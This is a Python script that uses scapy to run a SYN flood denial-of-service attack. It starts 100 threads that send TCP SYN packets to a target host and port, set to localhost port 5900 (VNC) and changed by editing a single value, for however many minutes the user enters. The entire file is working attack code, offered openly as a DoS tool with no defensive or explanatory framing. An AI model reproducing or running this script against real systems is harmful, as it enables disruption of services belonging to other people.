from scapy.all import *
import threading
import time

# Target details
target_ip = "127.0.0.1"  # Localhost
target_port = 5900  # VNC typically runs on port 5900

# Get the duration for the attack from the user
attack_duration = int(input("Enter the duration of the attack in minutes: ")) * 60  # Convert to seconds

# Function to perform the attack
def syn_flood():
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        try:
            # Create a SYN packet
            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            print(f"Sent SYN packet to {target_ip}:{target_port}")  # Debug output
        except Exception as e:
            print(f"Unexpected error: {e}")
        time.sleep(0.01)  # Short delay between attempts

# Number of threads to use in the attack
num_threads = 100

# Start the attack
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=syn_flood)
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("DoS attack completed.")
